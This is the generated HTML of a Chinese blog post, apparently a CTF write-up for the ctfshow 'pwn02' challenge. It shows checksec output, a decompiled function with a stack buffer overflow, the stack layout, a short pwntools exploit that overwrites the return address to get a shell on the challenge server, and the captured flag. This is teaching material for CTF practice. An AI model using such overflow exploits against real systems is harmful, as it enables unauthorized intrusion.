@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lsccc">
+
+
+
+
+
+<title>未知的路 | Lsccc</title>
+
+
+
+    <link rel="icon" href="/Lsccc.github.io/icon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/Lsccc.github.io/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/Lsccc.github.io/js/script.js"></script>
+    
+    <script src="/Lsccc.github.io/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/Lsccc.github.io/">Lsccc&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/Lsccc.github.io/archives">Posts</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/category">Categories</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/tag">Tags</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/about">About</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/link">Links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/Lsccc.github.io/">Lsccc&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/Lsccc.github.io/archives">Posts</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/category">Categories</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/tag">Tags</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/about">About</a>
+                
+                <a class="menu-item" href="/Lsccc.github.io/link">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">未知的路</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lsccc</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 17, 2025&nbsp;&nbsp;6:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/Lsccc.github.io/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>前言：</p>
+<blockquote>
+<p>为什么这个博客叫未知的路呢？其实，我不知道这条路能走多远，更不知道会经历什么样的折磨，但是我选择去探索这条路（砰砰砰）。</p>
+</blockquote>
+<h3 id="day01"><a href="#day01" class="headerlink" title="day01"></a>day01</h3><!--今日箴言：人如果不以成败论英雄，人生的意义何在呢？-->
+
+<h4 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h4><ol>
+<li><p>首先拿到题目，先checksec一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:       i386-32-little  			//32位程序</span><br><span class="line"> RELRO:      Partial RELRO			//全局偏移表保护</span><br><span class="line"> Stack:      No canary found	  		//栈溢出保护</span><br><span class="line"> NX:         NX enabled				//NX保护（不可执行栈）</span><br><span class="line"> PIE:        No PIE (0x8048000)   	 	//PIE保护</span><br><span class="line"> Stripped:   No			  		//去除符号信息机制</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>用32位IDA打开分析</p>
+</li>
+<li><p>先找到main函数，然后F5分析</p>
+</li>
+<li><p>发现有一个pwnme函数，点开后分析发现有栈溢出漏洞，我们既可以利用这个来传递payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[9]; </span><br><span class="line"></span><br><span class="line">  fgets(s, 50, stdin);	</span><br><span class="line">  			//这里s数组只有9个格子，但是fgets能读取50个，那么我们就可以利用这个栈溢出</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>现在我们分析，应该如何构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-00000009 s               db 9 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure>
+
+<p>通过这个我们发现我们可以先输入9个，然后在输入4个就达到了返回地址的那个栈内存位置，我们把这个返回位置替换成我们想要的位置(bin&#x2F;sh的地址)，就能实现反弹shell</p>
+</li>
+<li><p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">i = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28313</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x804850F</span>)</span><br><span class="line"></span><br><span class="line">i.send(payload)</span><br><span class="line"></span><br><span class="line">i.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>拿到flag</p>
+<p><em><strong>ctfshow{472e5447-1899-48a0-9a24-9f68cfcc0a96}</strong></em></p>
+</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lsccc</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://charles-sys-crypto.github.io/Lsccc.github.io/2025/11/17/%E6%9C%AA%E7%9F%A5%E7%9A%84%E8%B7%AF/">https://charles-sys-crypto.github.io/Lsccc.github.io/2025/11/17/%E6%9C%AA%E7%9F%A5%E7%9A%84%E8%B7%AF/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/Lsccc.github.io/tags/2025-11/"># 2025-11</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/Lsccc.github.io/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/Lsccc.github.io/2025/11/17/%E8%BF%B7%E9%A9%AC%E4%BC%A0%E5%A5%87/">迷马传奇</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lsccc | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
